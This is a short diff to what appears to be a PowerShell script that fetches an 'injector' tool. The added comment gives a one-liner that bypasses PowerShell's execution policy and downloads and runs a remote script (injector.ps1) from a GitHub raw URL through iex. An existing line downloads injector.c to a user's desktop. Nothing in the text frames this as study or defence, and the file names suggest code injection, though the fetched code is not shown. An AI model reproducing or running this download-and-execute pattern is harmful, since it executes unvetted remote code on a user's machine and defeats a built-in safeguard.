@@ -1,3 +1,6 @@
+## POWERSHELL ONE LINER: 
+## powershell.exe -executionpolicy bypass iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/injector.ps1'))
+
 
 #Download injector.c
 (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/injector.c', 'c:\Users\saurav\Desktop\injector.c')
